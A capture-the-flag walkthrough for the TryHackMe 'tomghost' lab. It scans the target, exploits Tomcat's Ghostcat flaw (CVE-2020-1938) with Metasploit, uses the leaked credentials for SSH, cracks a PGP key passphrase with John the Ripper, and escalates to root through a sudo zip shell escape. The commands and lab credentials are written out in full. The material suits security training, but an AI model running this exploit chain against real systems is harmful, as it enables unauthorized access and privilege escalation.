# [tomghost](https://tryhackme.com/room/tomghost)

## Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

# Flags

### Compromise this machine and obtain user.txt

1. Scan the target to identify running services

```bash
nmap -sV IP
```

[SCREEN01]

2. Exploit Ghostcat Vulnerability [CVE-2020-1938](https://www.exploit-db.com/exploits/49039)
   - The credantials are: `skyfuck:8730281lkjlkjdqlksalks`

```bash
msfconsole
search ghostcat
use auxiliary/admin/http/tomcat_ghostcat
show options
set RHOSTS TARGET_IP
run
```

[SCREEN02]

3. Use the discovered credentials to access the system via SSH. Once connected, explore the system to locate the user flag

```bash
ssh skyfuck@IP
# password: 8730281lkjlkjdqlksalks
cat /home/merlin/user.txt
```

[SCREEN03]

---

### Escalate privileges and obtain root.txt

1. Download files from `/home/skyfuck` to local machine for analysis

```bash
scp skyfuck@IP:/home/skyfuck/credential.pgp .
scp skyfuck@IP:/home/skyfuck/tryhackme.asc .
```

2. The `.asc` file is a PGP private key that's likely password-protected. We need to crack this password to decrypt the credential file.
   - Credentials are: `tryhackme:alexandru`

```bash
gpg2john tryhackme.asc > hash
john hash --wordlist=/root/Tools/wordlists/rockyou.txt
```

[SCREEN04]

3. Import the PGP key and decrypt the credential file
   - Credentials are: `merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

```bash
gpg --import tryhackme.asc
# password: alexandru
gpg --decrypt credential.pgp
# password: alexandru
```

[SCREEN05]

4. Switch to the merlin user using the discovered credentials

```bash
su merlin
#Password: asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
```

5. Check what sudo privileges the merlin user has

```bash
sudo -l
```

[SCREEN06]

6. According to [GTFOBins](https://gtfobins.github.io/gtfobins/zip/), the zip utility can be exploited for privilege escalation when run with sudo privileges. Once executed, you should have a root shell, and access to the root flag

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
cat /root/root.txt
```

[SCREEN07]
